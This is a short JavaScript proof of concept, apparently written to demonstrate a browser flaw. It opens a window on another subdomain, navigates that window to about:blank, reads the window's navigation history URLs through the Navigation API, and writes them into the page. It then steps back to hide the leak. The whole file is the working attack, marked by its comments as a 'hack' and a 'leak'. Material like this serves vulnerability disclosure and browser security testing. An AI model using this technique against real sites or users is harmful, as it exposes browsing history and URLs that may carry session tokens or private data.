// Function takes a window object
// and a name of an element to store the leak
function hack(w, t) {
  w.location = "about:blank";
  setTimeout(() => {
    let entries = w.navigation.entries();
    w.history.back(); // To restore the page after the leak

    let target = document.getElementById(t);
    target.innerHTML = "";

    for (e of entries) {
      target.append(e.url);
      target.append(document.createElement("br"));
    }
  }, 400);
} // Window object placeholder


var newWin; // Open a new window

function pop() {
  newWin = window.open("http://sub2.domain.localhost");
} // Leak from the window


function pull() {
  hack(newWin, "y");
}